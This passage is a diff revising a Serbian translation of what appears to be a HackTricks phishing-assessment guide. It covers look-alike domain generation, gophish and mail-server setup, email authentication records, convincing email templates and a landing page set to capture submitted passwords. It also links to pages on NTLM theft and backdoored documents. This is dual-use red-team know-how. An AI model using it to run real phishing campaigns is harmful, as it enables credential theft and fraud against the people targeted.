@@ -1,50 +1,50 @@
-# Metodologija phishinga
+# Phishing metodologija
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Metodologija
 
-1. Izvršite recon žrtve
-1. Izaberite **domen žrtve**.
-2. Izvršite osnovnu web enumeraciju **tražeći login portale** koje žrtva koristi i **odlučite** koji ćete **impersonate**.
-3. Koristite **OSINT** da **pronađete email adrese**.
+1. Izvršite izviđanje žrtve
+   1. Izaberite **domen žrtve**.
+   2. Obavite osnovno web enumerisanje **i potražite portale za prijavu** koje žrtva koristi, pa **odlučite** koji ćete **imitirati**.
+   3. Koristite **OSINT** da **pronađete email adrese**.
 2. Pripremite okruženje
-1. **Kupite domen** koji ćete koristiti za phishing assessment
-2. **Konfigurišite povezane zapise email servisa** (SPF, DMARC, DKIM, rDNS)
-3. Konfigurišite VPS sa **gophish**
-3. Pripremite campaign
-1. Pripremite **email template**
-2. Pripremite **web stranicu** za krađu credentials
-4. Pokrenite campaign!
+   1. **Kupite domen** koji ćete koristiti za phishing procenu
+   2. **Konfigurišite zapise** povezane sa email servisom (SPF, DMARC, DKIM, rDNS)
+   3. Konfigurišite VPS sa **gophish**
+3. Pripremite kampanju
+   1. Pripremite **email šablon**
+   2. Pripremite **web stranicu** za krađu akreditiva
+4. Pokrenite kampanju!
 
-## Generisanje sličnih naziva domena ili kupovina trusted domena
+## Generisanje sličnih naziva domena ili kupovina pouzdanog domena
 
-### Tehnike varijacije naziva domena
+### Tehnike variranja naziva domena
 
-- **Keyword**: Naziv domena **sadrži** važan **keyword** originalnog domena (npr., zelster.com-management.com).<sup>[[1]](#references)</sup>
-- **hypened subdomain**: Zamenite **tačku crticom** u subdomenu (npr., www-zelster.com).
-- **New TLD**: Isti domen uz korišćenje **novog TLD-a** (npr., zelster.org)
-- **Homoglyph**: **Zamenjuje** slovo u nazivu domena **slovima koja izgledaju slično** (npr., zelfser.com).
+- **Ključna reč**: Naziv domena **sadrži** važnu **ključnu reč** iz originalnog domena (npr. zelster.com-management.com).<sup>[[1]](#references)</sup>
+- **Poddomen sa crticom**: Zamenite **tačku crticom** u poddomenu (npr. www-zelster.com).
+- **Novi TLD**: Isti domen sa **novim TLD-om** (npr. zelster.org)
+- **Homoglif**: **Zamenite** slovo u nazivu domena **slovima koja izgledaju slično** (npr. zelfser.com).
 
 
 {{#ref}}
 homograph-attacks.md
 {{#endref}}
-- **Transposition:** **Menja mesta dvama slovima** unutar naziva domena (npr., zelsetr.com).
-- **Singularization/Pluralization**: Dodaje ili uklanja „s“ na kraju naziva domena (npr., zeltsers.com).
-- **Omission**: **Uklanja jedno** od slova iz naziva domena (npr., zelser.com).
-- **Repetition:** **Ponavlja jedno** od slova u nazivu domena (npr., zeltsser.com).
-- **Replacement**: Kao homoglyph, ali manje prikriveno. Zamenjuje jedno od slova u nazivu domena, možda slovom koje se na tastaturi nalazi u blizini originalnog slova (npr., zektser.com).
-- **Subdomained**: Uvodi **tačku** unutar naziva domena (npr., ze.lster.com).
-- **Insertion**: **Umeće slovo** u naziv domena (npr., zerltser.com).
-- **Missing dot**: Dodaje TLD na naziv domena (npr., zelstercom.com)
+- **Transpozicija:** **Zamenite mesta dvama slovima** u nazivu domena (npr. zelsetr.com).
+- **Jednina/množina**: Dodajte ili uklonite „s“ na kraju naziva domena (npr. zeltsers.com).
+- **Izostavljanje**: **Uklonite jedno** slovo iz naziva domena (npr. zelser.com).
+- **Ponavljanje:** **Ponovite jedno** slovo u nazivu domena (npr. zeltsser.com).
+- **Zamena**: Slično kao homoglif, ali manje neprimetno. Zamenite jedno slovo u nazivu domena, na primer slovom koje se na tastaturi nalazi blizu originalnog slova (npr. zektser.com).
+- **Umetanje tačke u domen**: Umetnite **tačku** unutar naziva domena (npr. ze.lster.com).
+- **Umetanje slova**: **Umetnite slovo** u naziv domena (npr. zerltser.com).
+- **Nedostajuća tačka**: Dodajte TLD na naziv domena (npr. zelstercom.com)
 
-**Automatic Tools**
+**Automatski alati**
 
 - [**dnstwist**](https://github.com/elceef/dnstwist)
 - [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)
 
-**Websites**
+**Veb-sajtovi**
 
 - [https://dnstwist.it/](https://dnstwist.it)
 - [https://dnstwister.report/](https://dnstwister.report)
@@ -52,20 +52,20 @@ homograph-attacks.md
 
 ### Bitflipping
 
-Postoji **mogućnost da se neki od bitova uskladištenih ili onih u komunikaciji automatski promene** zbog različitih faktora, kao što su solarne baklje, kosmički zraci ili hardverske greške.
+Postoji **mogućnost da se neki bitovi u memoriji ili tokom komunikacije automatski promene** usled različitih faktora, kao što su solarne baklje, kosmički zraci ili hardverske greške.
 
 Kada se ovaj koncept **primeni na DNS zahteve**, moguće je da **domen koji primi DNS server** nije isti kao domen koji je prvobitno zatražen.
 
-Na primer, izmena jednog bita u domenu „windows.com“ može ga promeniti u „windnws.com“.
+Na primer, izmena jednog bita u domenu „windows.com“ može da ga promeni u „windnws.com“.
 
-Attackers mogu **iskoristiti ovo registrovanjem više bit-flipping domena** koji su slični domenu žrtve. Njihova namera je da preusmere legitimne korisnike na sopstvenu infrastrukturu.
+Napadači mogu **da iskoriste ovo tako što će registrovati više domena nastalih promenom bitova** koji su slični domenu žrtve. Namera im je da preusmere legitimne korisnike na sopstvenu infrastrukturu.
 
 Za više informacija pročitajte [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>
 
-### Kupovina trusted domena
+### Kupovina pouzdanog domena
 
-Možete pretražiti [https://www.expireddomains.net/](https://www.expireddomains.net) i pronaći expired domen koji biste mogli koristiti.\
-Da biste bili sigurni da expired domen koji nameravate da kupite **već ima dobar SEO**, možete proveriti kako je kategorizovan na:
+Na [https://www.expireddomains.net/](https://www.expireddomains.net) možete potražiti istekli domen koji biste mogli da koristite.\
+Da biste proverili da li istekli domen koji nameravate da kupite **već ima dobar SEO**, možete da proverite kako je kategorizovan na sledećim sajtovima:
 
 - [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
 - [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)
@@ -78,8 +78,8 @@ Da biste bili sigurni da expired domen koji nameravate da kupite **već ima doba
 - [https://hunter.io/](https://hunter.io)
 - [https://anymailfinder.com/](https://anymailfinder.com)
 
-Da biste **pronašli više** važećih email adresa ili **verifikovali one** koje ste već pronašli, možete proveriti da li možete izvršiti brute-force nad SMTP serverima žrtve. [Ovde saznajte kako da verifikujete/pronađete email adresu](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
-Pored toga, ne zaboravite da, **ako korisnici koriste bilo koji web portal za pristup svojim emailovima**, možete proveriti da li je ranjiv na **username brute force** i iskoristiti ranjivost ako je moguće.
+Da biste **pronašli još** važećih email adresa ili **proverili one** koje ste već pronašli, možete da proverite da li možete da ih brute-force-ujete preko SMTP servera žrtve. [Ovde saznajte kako da proverite/pronađete email adrese](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
+Takođe, ne zaboravite da ako korisnici koriste **neki web portal za pristup emailu**, možete da proverite da li je ranjiv na **brute force napade na korisnička imena** i da iskoristite ranjivost ako je to moguće.
 
 ## Konfigurisanje GoPhish
 
@@ -87,16 +87,19 @@ Pored toga, ne zaboravite da, **ako korisnici koriste bilo koji web portal za pr
 
 Možete ga preuzeti sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)
 
-Preuzmite ga, dekompresujte unutar `/opt/gophish` i izvršite `/opt/gophish/gophish`\
-U izlazu ćete dobiti lozinku za admin korisnika na portu 3333. Zato pristupite tom portu i iskoristite te credentials da promenite admin lozinku. Možda ćete morati da tunelujete taj port na lokalni:
+Preuzmite ga, raspakujte u `/opt/gophish` i pokrenite `/opt/gophish/gophish`\
+U izlazu će vam biti prikazana lozinka za admin korisnika na portu 3333. Zato pristupite tom portu i upotrebite te akreditive da promenite admin lozinku. Možda ćete morati da tunelujete taj port do lokalne mašine:
+
 ```bash
 ssh -L 3333:127.0.0.1:3333 <user>@<ip>
 ```
+
 ### Konfiguracija
 
 **Konfiguracija TLS sertifikata**
 
-Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i on mora biti **usmeren** na **IP adresu VPS-a** na kojem konfigurišete **gophish**.
+Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i da on **pokazuje** na **IP adresu VPS-a** na kojem konfigurišete **gophish**.
+
 ```bash
 DOMAIN="<domain>"
 wget https://dl.eff.org/certbot-auto
@@ -112,61 +115,67 @@ mkdir /opt/gophish/ssl_keys
 cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
 cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
 ```
-**Konfiguracija maila**
 
-Započnite instalaciju: `apt-get install postfix`
+**Konfiguracija pošte**
 
-Zatim dodajte domen u sledeće fajlove:
+Započnite instalacijom: `apt-get install postfix`
+
+Zatim dodajte domen u sledeće datoteke:
 
 - **/etc/postfix/virtual_domains**
 - **/etc/postfix/transport**
 - **/etc/postfix/virtual_regexp**
 
-**Takođe promenite vrednosti sledećih promenljivih unutar /etc/postfix/main.cf**
+**Promenite i vrednosti sledećih promenljivih u datoteci /etc/postfix/main.cf**
 
 `myhostname = <domain>`\
 `mydestination = $myhostname, <domain>, localhost.com, localhost`
 
-Na kraju izmenite fajlove **`/etc/hostname`** i **`/etc/mailname`** tako da sadrže naziv vašeg domena i **restartujte VPS.**
+Na kraju izmenite datoteke **`/etc/hostname`** i **`/etc/mailname`** tako da sadrže ime vašeg domena i **restartujte VPS.**
 
-Sada kreirajte **DNS A record** za `mail.<domain>` koji pokazuje na **IP adresu** VPS-a, kao i **DNS MX** record koji pokazuje na `mail.<domain>`.
+Sada napravite **DNS A record** za `mail.<domain>` koji pokazuje na **IP adresu** VPS-a i **DNS MX** record koji pokazuje na `mail.<domain>`
 
-Sada testirajmo slanje emaila:
+Sada testirajmo slanje e-pošte:
+
 ```bash
 apt install mailutils
 echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
 ```
+
 **Gophish konfiguracija**
 
-Zaustavimo izvršavanje Gophish-a i konfigurišimo ga.\
-Izmenite `/opt/gophish/config.json` na sledeći način (obratite pažnju na korišćenje https):
+Zaustavite gophish i konfigurišimo ga.\
+Izmenite `/opt/gophish/config.json` ovako (obratite pažnju na korišćenje https):
+
 ```bash
 {
-"admin_server": {
-"listen_url": "127.0.0.1:3333",
-"use_tls": true,
-"cert_path": "gophish_admin.crt",
-"key_path": "gophish_admin.key"
-},
-"phish_server": {
-"listen_url": "0.0.0.0:443",
-"use_tls": true,
-"cert_path": "/opt/gophish/ssl_keys/key.crt",
-"key_path": "/opt/gophish/ssl_keys/key.pem"
-},
-"db_name": "sqlite3",
-"db_path": "gophish.db",
-"migrations_prefix": "db/db_",
-"contact_address": "",
-"logging": {
-"filename": "",
-"level": ""
-}
+        "admin_server": {
+                "listen_url": "127.0.0.1:3333",
+                "use_tls": true,
+                "cert_path": "gophish_admin.crt",
+                "key_path": "gophish_admin.key"
+        },
+        "phish_server": {
+                "listen_url": "0.0.0.0:443",
+                "use_tls": true,
+                "cert_path": "/opt/gophish/ssl_keys/key.crt",
+                "key_path": "/opt/gophish/ssl_keys/key.pem"
+        },
+        "db_name": "sqlite3",
+        "db_path": "gophish.db",
+        "migrations_prefix": "db/db_",
+        "contact_address": "",
+        "logging": {
+                "filename": "",
+                "level": ""
+        }
 }
 ```
+
 **Konfigurisanje gophish servisa**
 
-Da biste kreirali gophish servis kako bi mogao automatski da se pokreće i da se njime upravlja kao servisom, možete kreirati datoteku `/etc/init.d/gophish` sa sledećim sadržajem:
+Da biste kreirali gophish servis kako bi mogao automatski da se pokreće i njime upravlja kao servisom, možete da kreirate datoteku `/etc/init.d/gophish` sa sledećim sadržajem:
+
 ```bash
 #!/bin/bash
 # /etc/init.d/gophish
@@ -187,33 +196,35 @@ logfile=/var/log/gophish/gophish.log
 errfile=/var/log/gophish/gophish.error
 
 start() {
-echo 'Starting '${processName}'...'
-cd ${appDirectory}
-nohup ./$process >>$logfile 2>>$errfile &
-sleep 1
+    echo 'Starting '${processName}'...'
+    cd ${appDirectory}
+    nohup ./$process >>$logfile 2>>$errfile &
+    sleep 1
 }
 
 stop() {
-echo 'Stopping '${processName}'...'
-pid=$(/bin/pidof ${process})
-kill ${pid}
-sleep 1
+    echo 'Stopping '${processName}'...'
+    pid=$(/bin/pidof ${process})
+    kill ${pid}
+    sleep 1
 }
 
 status() {
-pid=$(/bin/pidof ${process})
-if [["$pid" != ""| "$pid" != "" ]]; then
-echo ${processName}' is running...'
-else
-echo ${processName}' is not running...'
-fi
+    pid=$(/bin/pidof ${process})
+    if [["$pid" != ""| "$pid" != "" ]]; then
+        echo ${processName}' is running...'
+    else
+        echo ${processName}' is not running...'
+    fi
 }
 
 case $1 in
-start|stop|status) "$1" ;;
+    start|stop|status) "$1" ;;
 esac
 ```
-Završite konfigurisanje servisa i proveru tako što ćete:
+
+Dovršite konfigurisanje servisa i proverite ga tako što ćete:
+
 ```bash
 mkdir /var/log/gophish
 chmod +x /etc/init.d/gophish
@@ -224,60 +235,68 @@ service gophish status
 ss -l | grep "3333\|443"
 service gophish stop
 ```
+
 ## Konfigurisanje mail servera i domena
 
 ### Sačekajte i budite legitimni
 
-Što je domen stariji, manja je verovatnoća da će biti označen kao spam. Zato treba da sačekate što je moguće duže (najmanje 1 nedelju) pre phishing procene. Pored toga, ako postavite stranicu o sektoru sa dobrom reputacijom, stečena reputacija će biti bolja.
+Što je domen stariji, manja je verovatnoća da će biti označen kao spam. Zato treba da sačekate što je duže moguće (najmanje 1 nedelju) pre phishing procene. Štaviše, ako postavite stranicu o sektoru sa dobrom reputacijom, stečena reputacija biće bolja.
 
 Imajte na umu da, čak i ako morate da sačekate nedelju dana, sve možete da konfigurišete već sada.
 
 ### Konfigurisanje Reverse DNS (rDNS) zapisa
 
-Podesite rDNS (PTR) zapis koji razrešava IP adresu VPS-a na naziv domena.
+Postavite rDNS (PTR) zapis koji razrešava IP adresu VPS-a u ime domena.
 
 ### Sender Policy Framework (SPF) zapis
 
-Morate **konfigurisati SPF zapis za novi domen**. Ako ne znate šta je SPF zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).
+Morate **da konfigurišete SPF zapis za novi domen**. Ako ne znate šta je SPF zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).
 
-Možete koristiti [https://www.spfwizard.net/](https://www.spfwizard.net) da generišete svoju SPF politiku (koristite IP adresu VPS mašine)
+Možete da koristite [https://www.spfwizard.net/](https://www.spfwizard.net) da generišete SPF policy (koristite IP adresu VPS mašine)
 
 ![SPF Wizard obrazac za generisanje SPF zapisa za phishing domen](<../../images/image (1037).png>)
 
-Ovo je sadržaj koji mora biti postavljen unutar TXT zapisa u domenu:
+Ovaj sadržaj treba da bude postavljen unutar TXT zapisa u domenu:
+
 ```bash
 v=spf1 mx a ip4:ip.ip.ip.ip ?all
 ```
-### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record
 
-Morate **konfigurisati DMARC record za novi domen**. Ako ne znate šta je DMARC record, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).
+### Zapis Domain-based Message Authentication, Reporting & Conformance (DMARC)
 
-Morate kreirati novi DNS TXT record koji pokazuje na hostname `_dmarc.<domain>`, sa sledećim sadržajem:
+Morate **da konfigurišete DMARC zapis za novi domen**. Ako ne znate šta je DMARC zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).
+
+Morate da kreirate novi DNS TXT zapis koji pokazuje na hostname `_dmarc.<domain>` sa sledećim sadržajem:
+
 ```bash
 v=DMARC1; p=none
 ```
+
 ### DomainKeys Identified Mail (DKIM)
 
-Morate **konfigurisati DKIM za novi domen**. Ako ne znate šta je DKIM zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).
+Morate **da konfigurišete DKIM za novi domen**. Ako ne znate šta je DKIM zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).
 
 Ovaj vodič je zasnovan na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>
 
 > [!TIP]
-> Potrebno je da spojite obe B64 vrednosti koje DKIM ključ generiše:
+> Potrebno je da spojite obe B64 vrednosti koje generiše DKIM ključ:
 >
 > ```
 > v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
 > ```
 
-### Testirajte ocenu konfiguracije svoje e-pošte
+### Proverite ocenu konfiguracije e-pošte
 
-To možete uraditi pomoću [https://www.mail-tester.com/](https://www.mail-tester.com)\
-Samo otvorite stranicu i pošaljite e-poštu na adresu koju vam daju:
+To možete da uradite pomoću [https://www.mail-tester.com/](https://www.mail-tester.com)\
+Samo otvorite stranicu i pošaljite e-poruku na adresu koju vam daju:
+
 ```bash
 echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
 ```
-Takođe možete **proveriti konfiguraciju e-pošte** slanjem e-poruke na `check-auth@verifier.port25.com` i **čitanjem odgovora** (za ovo ćete morati da **otvorite** port **25** i vidite odgovor u datoteci _/var/mail/root_ ako e-poruku šaljete kao root).\
-Proverite da li prolazite sve testove:
+
+Možete i da **proverite konfiguraciju emaila** tako što ćete poslati email na `check-auth@verifier.port25.com` i **pročitati odgovor** (za ovo ćete morati da otvorite port **25** i pogledate odgovor u datoteci _/var/mail/root_ ako email pošaljete kao root).\
+Proverite da li ste prošli sve testove:
+
 ```bash
 ==========================================================
 Summary of Results
@@ -288,44 +307,48 @@ DKIM check:         pass
 Sender-ID check:    pass
 SpamAssassin check: ham
 ```
-Možete takođe poslati **poruku na Gmail nalog pod vašom kontrolom** i proveriti **zaglavlja emaila** u Gmail prijemnom sandučetu; `dkim=pass` bi trebalo da bude prisutan u polju zaglavlja `Authentication-Results`.
+
+Takođe možete poslati **poruku na Gmail nalog koji kontrolišete** i proveriti **zaglavlja e-pošte** u Gmail prijemnom sandučetu. U polju zaglavlja `Authentication-Results` trebalo bi da bude prisutno `dkim=pass`.
+
 ```
 Authentication-Results: mx.google.com;
-spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
-dkim=pass header.i=@example.com;
+       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
+       dkim=pass header.i=@example.com;
 ```
-### ​Uklanjanje sa Spamhouse crne liste
 
-Stranica [www.mail-tester.com](https://www.mail-tester.com) može da vam pokaže da li spamhouse blokira vaš domen. Zahtev za uklanjanje domena/IP adrese možete poslati na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)
+### ​Uklanjanje sa Spamhaus crne liste
+
+Stranica [www.mail-tester.com](https://www.mail-tester.com) može da vam kaže da li Spamhaus blokira vaš domen. Možete da zatražite uklanjanje domena/IP adrese na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)
 
 ### Uklanjanje sa Microsoft crne liste
 
-​​Zahtev za uklanjanje domena/IP adrese možete poslati na [https://sender.office.com/](https://sender.office.com).
+​​Možete da zatražite uklanjanje domena/IP adrese na [https://sender.office.com/](https://sender.office.com).
 
 ## Kreiranje i pokretanje GoPhish kampanje
 
 ### Profil za slanje
 
-- Postavite neko **ime za identifikaciju** profila pošiljaoca
-- Odlučite sa kog naloga ćete slati phishing emailove. Predlozi: _noreply, support, servicedesk, salesforce..._
-- Polja za korisničko ime i lozinku možete ostaviti praznim, ali obavezno označite Ignore Certificate Errors
+- Unesite **naziv po kom ćete prepoznati** profil pošiljaoca
+- Odlučite sa kog naloga ćete slati phishing imejlove. Predlozi: _noreply, support, servicedesk, salesforce..._
+- Polja za korisničko ime i lozinku možete da ostavite prazna, ali obavezno označite Ignore Certificate Errors
 
-![Kreiranje i pokretanje GoPhish kampanje - Profil za slanje: Polja za korisničko ime i lozinku možete ostaviti praznim, ali obavezno označite Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)
+![Kreiranje i pokretanje GoPhish kampanje - Profil za slanje: Polja za korisničko ime i lozinku možete da ostavite prazna, ali obavezno označite Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)
 
 > [!TIP]
-> Preporučuje se da koristite funkcionalnost "**Send Test Email**" kako biste proverili da li sve funkcioniše.\
-> Preporučujem da **test emailove šaljete na 10min mail adrese** kako biste izbegli stavljanje na crnu listu tokom testiranja.
+> Preporučuje se da koristite funkciju "**Send Test Email**" kako biste proverili da sve radi.\
+> Preporučujem da **testne imejlove šaljete na adrese za 10min mail**, kako biste izbegli stavljanje na crnu listu tokom testiranja.
 
-### Email šablon
+### Šablon imejla
 
-- Postavite neko **ime za identifikaciju** šablona
-- Zatim napišite **subject** (ništa neobično, samo nešto što biste očekivali da pročitate u uobičajenom emailu)
-- Proverite da li je označeno "**Add Tracking Image**"
-- Napišite **email šablon** (možete koristiti promenljive kao u sledećem primeru):
+- Unesite **naziv po kom ćete prepoznati** šablon
+- Zatim napišite **naslov** (ništa neobično, samo nešto što biste očekivali u običnom imejlu)
+- Proverite da li je označena opcija "**Add Tracking Image**"
+- Napišite **šablon imejla** (možete da koristite promenljive kao u primeru ispod):
+
 ```html
 <html>
 <head>
-<title></title>
+    <title></title>
 </head>
 <body>
 <p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
@@ -340,63 +363,64 @@ WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY
 </body>
 </html>
 ```
-Imajte na umu da se, **kako bi se povećala verodostojnost emaila**, preporučuje korišćenje nekog potpisa iz emaila klijenta. Predlozi:
 
-- Pošaljite email na **nepostojeću adresu** i proverite da li odgovor sadrži potpis.
-- Pretražite **javne email adrese** kao što su info@ex.com, press@ex.com ili public@ex.com, pošaljite im email i sačekajte odgovor.
-- Pokušajte da kontaktirate **neki pronađeni validan** email i sačekajte odgovor.
+Imajte na umu da se, **kako bi se povećala uverljivost imejla**, preporučuje korišćenje potpisa iz nekog imejla klijenta. Predlozi:
 
-![Sending Profile - Email Template: Pokušajte da kontaktirate neki pronađeni validan email i sačekajte odgovor](<../../images/image (80).png>)
+- Pošaljite imejl na **nepostojeću adresu** i proverite da li odgovor sadrži potpis.
+- Potražite **javne imejl adrese** kao što su info@ex.com, press@ex.com ili public@ex.com, pošaljite im imejl i sačekajte odgovor.
+- Pokušajte da kontaktirate neku **pronađenu važeću** imejl adresu i sačekajte odgovor.
+
+![Sending Profile - Email Template: Pokušajte da kontaktirate neku pronađenu važeću imejl adresu i sačekajte odgovor](<../../images/image (80).png>)
 
 > [!TIP]
-> Email Template takođe omogućava **dodavanje fajlova za slanje**. Ako biste takođe želeli da ukradete NTLM izazove pomoću posebno kreiranih fajlova/dokumenata, [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).
+> Email Template omogućava i **dodavanje fajlova u prilogu za slanje**. Ako želite i da ukradete NTLM izazove pomoću posebno pripremljenih fajlova/dokumenata, [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).
 
-### Landing Page
+### Odredišna stranica
 
 - Unesite **ime**
-- **Napišite HTML code** web stranice. Imajte na umu da možete **importovati** web stranice.
+- **Napišite HTML kod** veb-stranice. Imajte na umu da možete i da **uvezete** veb-stranice.
 - Označite **Capture Submitted Data** i **Capture Passwords**
-- Podesite **redirection**
+- Podesite **preusmeravanje**
 
 ![Email Template - Landing Page: Označite Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)
 
 > [!TIP]
-> Obično ćete morati da izmenite HTML code stranice i obavite nekoliko testova lokalno (možda pomoću nekog Apache servera) **sve dok ne budete zadovoljni rezultatima.** Zatim unesite taj HTML code u polje.\
-> Imajte na umu da, ako treba da **koristite neke statičke resurse** za HTML (možda neke CSS i JS stranice), možete ih sačuvati u _**/opt/gophish/static/endpoint**_ i zatim im pristupiti preko _**/static/\<filename>**_
+> Obično ćete morati da izmenite HTML kod stranice i testirate ga lokalno (možda pomoću Apache servera) **dok ne budete zadovoljni rezultatima.** Zatim unesite taj HTML kod u polje.\
+> Imajte na umu da, ako HTML koristi **statičke resurse** (na primer, CSS i JS stranice), možete da ih sačuvate u _**/opt/gophish/static/endpoint**_ i zatim im pristupite preko _**/static/\<filename>**_
 
 > [!TIP]
-> Za redirection možete **preusmeriti korisnike na legitimnu glavnu web stranicu** žrtve ili ih, na primer, preusmeriti na _/static/migration.html_, postaviti neki **spinning wheel (**[**https://loading.io/**](https://loading.io)**) na 5 sekundi, a zatim prikazati da je proces uspešno završen**.
+> Za preusmeravanje možete **preusmeriti korisnike na legitimnu glavnu veb-stranicu žrtve** ili, na primer, na _/static/migration.html_, prikazati **kružni indikator učitavanja (**[**https://loading.io/**](https://loading.io)**) tokom 5 sekundi, a zatim prikazati poruku da je proces uspešno završen**.
 
-### Users & Groups
+### Korisnici i grupe
 
-- Podesite ime
-- **Importujte podatke** (imajte na umu da je za korišćenje template-a iz primera potrebno ime, prezime i email adresa svakog korisnika)
+- Unesite ime
+- **Uvezite podatke** (imajte na umu da su za korišćenje šablona iz primera potrebni ime, prezime i imejl adresa svakog korisnika)
 
-![Landing Page - Users & Groups: Importujte podatke (imajte na umu da je za korišćenje template-a iz primera potrebno ime, prezime i email adresa svakog korisnika)](<../../images/image (163).png>)
+![Landing Page - Users & Groups: Uvezite podatke (imajte na umu da su za korišćenje šablona iz primera potrebni ime, prezime i imejl adresa svakog korisnika)](<../../images/image (163).png>)
 
-### Campaign
+### Kampanja
 
-Na kraju, kreirajte campaign izborom imena, email template-a, landing page-a, URL-a, sending profile-a i grupe. Imajte na umu da će URL biti link poslat žrtvama.
+Na kraju, kreirajte kampanju tako što ćete izabrati ime, šablon imejla, odredišnu stranicu, URL, profil za slanje i grupu. Imajte na umu da će URL biti link poslat žrtvama.
 
-Imajte na umu da **Sending Profile omogućava slanje testnog emaila kako biste videli kako će konačni phishing email izgledati**:
+Imajte na umu da **Sending Profile omogućava slanje probnog imejla kako biste videli kako će izgledati konačni phishing imejl**:
 
-![Users & Groups - Campaign: Imajte na umu da Sending Profile omogućava slanje testnog emaila kako biste videli kako će konačni phishing email izgledati](<../../images/image (192).png>)
+![Users & Groups - Campaign: Imajte na umu da Sending Profile omogućava slanje probnog imejla kako biste videli kako će izgledati konačni phishing imejl](<../../images/image (192).png>)
 
-Kada je sve spremno, samo pokrenite campaign!
+Kada sve bude spremno, pokrenite kampanju!
 
-## Website Cloning
+## Kloniranje veb-sajta
 
-Ako iz bilo kog razloga želite da klonirate web stranicu, pogledajte sledeću stranicu:
+Ako iz nekog razloga želite da klonirate veb-sajt, pogledajte sledeću stranicu:
 
 
 {{#ref}}
 clone-a-website.md
 {{#endref}}
 
-## Backdoored Documents & Files
+## Dokumenti i fajlovi sa backdoor-om
 
-U nekim phishing procenama (uglavnom za Red Teams) takođe ćete želeti da **pošaljete fajlove koji sadrže neku vrstu backdoor-a** (možda C2 ili nešto što će pokrenuti authentication).\
-Pogledajte sledeću stranicu za neke primere:
+U nekim phishing procenama (uglavnom za Red Teams) možda ćete želeti i da **pošaljete fajlove koji sadrže neki oblik backdoor-a** (možda C2 ili samo nešto što će pokrenuti autentifikaciju).\
+Na sledećoj stranici možete pronaći nekoliko primera:
 
 
 {{#ref}}
@@ -405,274 +429,286 @@ phishing-documents.md
 
 ## Phishing MFA
 
-### Via Proxy MitM
+### Preko Proxy MitM
 
-Prethodni napad je prilično domišljat jer lažirate stvarnu web stranicu i prikupljate informacije koje korisnik unosi. Nažalost, ako korisnik nije uneo ispravnu lozinku ili ako je aplikacija koju ste lažirali podešena sa 2FA, **ove informacije vam neće omogućiti da se predstavljate kao prevareni korisnik**.
